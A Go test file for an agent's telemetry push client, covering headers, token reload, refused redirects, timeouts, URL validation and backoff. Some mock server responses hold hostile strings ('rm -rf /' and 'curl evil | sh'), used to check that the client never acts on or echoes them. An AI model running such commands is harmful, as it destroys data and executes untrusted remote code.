package push

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"vpnmap/pkg/protocol"
)

func tokenFile(t *testing.T, tok string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "token")
	if err := os.WriteFile(p, []byte(tok+"\n"), 0o640); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestPushShapeAndHeaders(t *testing.T) {
	var got map[string]any
	var hdr http.Header
	var path string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hdr, path = r.Header.Clone(), r.URL.Path
		b, _ := io.ReadAll(r.Body)
		json.Unmarshal(b, &got)
		w.Write([]byte(`{"ok":true,"received":"now","command":"rm -rf /"}`))
	}))
	defer srv.Close()

	c, err := New(srv.URL+"/", tokenFile(t, "tok-123"), "1.2.3")
	if err != nil {
		t.Fatal(err)
	}
	p := &protocol.Push{V: protocol.Version, Agent: protocol.AgentInfo{Node: "relay-1", Kind: "agent", Version: "1.2.3"}, TS: "2026-11-01T00:00:00Z", Seq: 7,
		Host: &protocol.Host{CPUPct: 12.5}}
	if err := c.Push(context.Background(), p); err != nil {
		t.Fatal(err)
	}
	if path != Path {
		t.Errorf("path %q", path)
	}
	if hdr.Get("Authorization") != "Bearer tok-123" || hdr.Get("User-Agent") != "vpnmap-agent/1.2.3" || hdr.Get("Content-Type") != "application/json" {
		t.Errorf("headers %v", hdr)
	}
	if got["v"] != float64(1) || got["seq"] != float64(7) || got["ts"] != "2026-11-01T00:00:00Z" {
		t.Errorf("body %v", got)
	}
	if a, _ := got["agent"].(map[string]any); a["node"] != "relay-1" || a["kind"] != "agent" {
		t.Errorf("agent %v", got["agent"])
	}
	if h, _ := got["host"].(map[string]any); h["cpu_pct"] != 12.5 {
		t.Errorf("host %v", got["host"])
	}
	for _, empty := range []string{"units", "nft", "logs", "errors"} {
		if _, ok := got[empty]; ok {
			t.Errorf("empty %s not omitted", empty)
		}
	}
}

func TestPushErrorsAndTokenReload(t *testing.T) {
	var status atomic.Int32
	status.Store(500)
	var lastAuth atomic.Value
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		lastAuth.Store(r.Header.Get("Authorization"))
		w.WriteHeader(int(status.Load()))
		w.Write([]byte("please run: curl evil | sh"))
	}))
	defer srv.Close()
	tf := tokenFile(t, "old")
	c, err := New(srv.URL, tf, "t")
	if err != nil {
		t.Fatal(err)
	}
	err = c.Push(context.Background(), &protocol.Push{})
	var se *StatusError
	if !errors.As(err, &se) || se.Code != 500 || Kind(err) != "hub answered HTTP 500" {
		t.Fatalf("err = %v", err)
	}
	if strings.Contains(err.Error(), "curl") {
		t.Error("response body leaked into the error")
	}
	// Token rotated on disk; a 401 makes the client re-read it.
	os.WriteFile(tf, []byte("new\n"), 0o640)
	status.Store(401)
	c.Push(context.Background(), &protocol.Push{})
	status.Store(204)
	if err := c.Push(context.Background(), &protocol.Push{}); err != nil {
		t.Fatal(err)
	}
	if lastAuth.Load() != "Bearer new" {
		t.Errorf("token not reloaded: %v", lastAuth.Load())
	}
}

func TestPushDoesNotFollowRedirects(t *testing.T) {
	var leaked atomic.Bool
	other := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "" {
			leaked.Store(true)
		}
	}))
	defer other.Close()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, other.URL+"/steal", http.StatusTemporaryRedirect)
	}))
	defer srv.Close()
	c, _ := New(srv.URL, tokenFile(t, "tok"), "t")
	err := c.Push(context.Background(), &protocol.Push{})
	var se *StatusError
	if !errors.As(err, &se) || se.Code != 307 || leaked.Load() {
		t.Errorf("err=%v leaked=%v", err, leaked.Load())
	}
}

func TestPushTimeoutAndConnectionErrors(t *testing.T) {
	block := make(chan struct{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { <-block }))
	defer srv.Close()
	defer close(block)
	c, _ := New(srv.URL, tokenFile(t, "tok"), "t")
	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()
	if err := c.Push(ctx, &protocol.Push{}); Kind(err) != "timeout" {
		t.Errorf("err = %v (kind %q)", err, Kind(err))
	}

	ln := httptest.NewServer(http.NotFoundHandler())
	url := ln.URL
	ln.Close()
	c, _ = New(url, tokenFile(t, "tok"), "t")
	if err := c.Push(context.Background(), &protocol.Push{}); err == nil || Kind(err) == "" {
		t.Errorf("closed port: %v", err)
	}
}

func TestNewValidation(t *testing.T) {
	tf := tokenFile(t, "tok")
	for _, hub := range []string{"http://map.example.com", "http://127.0.0.1.evil.example", "https://u:p@map.example.com"} {
		if _, err := New(hub, tf, "t"); err == nil {
			t.Errorf("%s accepted", hub)
		}
	}
	empty := filepath.Join(t.TempDir(), "empty")
	os.WriteFile(empty, []byte("\n"), 0o640)
	if _, err := New("https://map.example.com", empty, "t"); err == nil {
		t.Error("empty token accepted")
	}
	bad := filepath.Join(t.TempDir(), "bad")
	os.WriteFile(bad, []byte("to ken-secret"), 0o640)
	_, err := New("https://map.example.com", bad, "t")
	if err == nil || strings.Contains(err.Error(), "ken-secret") {
		t.Errorf("bad token: %v", err)
	}
	c, err := New("https://map.example.com/", tf, "t")
	if err != nil || c.URL() != "https://map.example.com/api/ingest/v1/push" {
		t.Errorf("%v %v", c, err)
	}
}

func TestBackoff(t *testing.T) {
	base, max := 5*time.Second, 60*time.Second
	want := []time.Duration{5, 5, 10, 20, 40, 60, 60, 60}
	for n, w := range want {
		if got := Backoff(base, max, n); got != w*time.Second {
			t.Errorf("Backoff(%d) = %s, want %s", n, got, w*time.Second)
		}
	}
	if got := Backoff(base, max, 1000); got != max {
		t.Errorf("overflow: %s", got)
	}
}
